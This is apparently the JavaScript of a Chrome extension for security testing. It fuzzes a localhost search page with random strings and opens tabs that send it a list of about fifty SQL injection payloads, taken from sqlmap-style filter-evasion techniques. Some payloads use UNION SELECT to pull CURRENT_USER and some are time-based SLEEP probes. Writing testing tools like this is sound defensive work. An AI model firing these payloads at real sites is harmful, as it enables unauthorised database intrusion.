//generates a single random charcter
function randomChar(characters){
    var pool = "";
    var allChars = [
                "0123456789",
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "abcdefghiklmnopqrstuvwxyz",
                "=+-_)(*&^%$#@!~<,>.?:;[]{}",
                "œ∑´®†¥¨ˆøπ“‘«åß∂ƒ©˙∆˚¬˚…æΩ≈ç√∫˜µ≤≥÷",
                "¡™£¢∞§¶•ªº–≠"
                ];

    for (let i=0; i<allChars.length; i++){
        if (characters[i] == true){
            pool = pool.concat(allChars[i]);
        }
    }

    var r = Math.floor(Math.random() * pool.length);
    return pool.substring(r,r+1);
}

//------------------------------------------------------------------------------
function createString(len, characters){
    var s = '';
    for (var i=0; i<len; i++){
        s = s.concat(randomChar(characters));
    }
    return s;
}

//------------------------------------------------------------------------------
function fillForm(s){
    //TODO
    //find the submit/search bar and fill it out

    var injection = "document.forms[0].elements[0].name=".concat(s);

    chrome.tabs.executeScript(null,
    {
        code: injection
    });

}
//------------------------------------------------------------------------------

//------------------------------------------------------------------------------
//--------------------The Various Tests Functions-------------------------------
//------------------------------------------------------------------------------
function startSQL(){

    var sqlDatabase = [
    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871', // apostrophemask
    '1 AND %00%271%00%27=%00%271', //apostrophenullencode
    '1 AND 1=1%00', // appendnullbyte
    'MScgQU5EIFNMRUVQKDUpIw==', // base64encode
    '1 AND A BETWEEN B AND B--', //between
    'SELECT%09id FROM%09users WHERE%09id LIKE 1', // bluecoat
    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545', //chardoubleencode
    '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45', //charencode
    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045', //charunicodeescape
    'LIMIT 3 OFFSET 2',//commaLessLimit
    'MID(VERSION() FROM 1 FOR 1)',//commalessmid
    'SELECT ABS/**/(1)', //commalessparenthesis
    'CONCAT_WS(MID(CHAR(0),0,0),1,2)', //concat2concatws
    'SELECT * FROM users WHERE id LIKE 1',
    '1\\\\" AND SLEEP(5)#', //escape quotes
    '1 AND GREATEST(A,B+1)=A', //greatest
    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa", //halfversionedmorekeywords
    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;', //htmlencode
    'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END', //ifnull2casewhenisnull
    'IF(ISNULL(1),2,1)', //ifnull2ifisnull
    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES', //informationschemacomment
    '1 AND LEAST(A,B+1)=B+1', //least
    'insert', //lowercase
    '1 /*!30874AND 2>1*/--', //modsecurityversioned
    '1 UNIOUNIONN SELESELECTCT 2--', //nonrecursivereplacement
    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1', //overlongutf8
    '%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1', //overlongutf8more
    '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E', //percentage
    'INseRt', //randomcase
    'I/**/N/**/SERT', //randomcomments
    "1 AND 1=1 and '0having'='0having'", //secure sphere
    '1 AND 9227=9227-- sp_password', //sp_password
    'SELECT/**/id/**/FROM/**/users', //space2comment
    '1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227', //space2hash
    'SELECT/**_**/id/**_**/FROM/**_**/users', //space2morecomment
    '1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227', //space2morehash
    '1%23%0AAND%23%0A9227=9227',//space2mssqlhash
    'SELECT%A0id%0BFROM%0Cusers', //space2mysqlblank
    '1--%0AAND--%0A9227=9227', //space2mysqldash
    'SELECT+id+FROM+users', //space2plus
    'SELECT%0Did%0DFROM%0Ausers', //space2randomblank
    "1 %26%26 '1'='1", //symboliclogical
    '-1 UNION SELECT', //unionalltounion
    '1%bf%27-- ', //unmagicquotes
    'INSERT', //uppercase
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#', //versionedkeywords
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#' //versionedmorekeywords
    ];
    var site1 = "http://localhost:8888/search.php?search=";
    var test1 = site1.concat(sqlDatabase[0]);

    for (let i=1; i < sqlDatabase.length; i++){
        chrome.tabs.create({'url': test1});
        test1 = site1.concat(sqlDatabase[i]);

    }

}

//------------------------------------------------------------------------------
function startFuzzing(fuzLen, iterCount, characters){

    var site = "http://localhost:8888/search.php?search=" // search term will be appended
    var test = site.concat(createString(fuzLen,characters));

    for (let i = 0; i < iterCount; i++) {
        chrome.tabs.create({'url': test}); // right now website is hardcoded...
        test = site.concat(createString(fuzLen,characters));
    }
}



function receive_page_token() {

    var info =
    {
        'csrf_token': ""
    };
    // receive information from the webpage
    chrome.runtime.onMessage.addListener(
              function(request, sender, sendResponse) {
                        info.csrf_token = request.csrf_token;
                        sendResponse({received: "received security info"});
                        });
    return info;
}

var token_info = receive_page_token();
console.log(token_info);
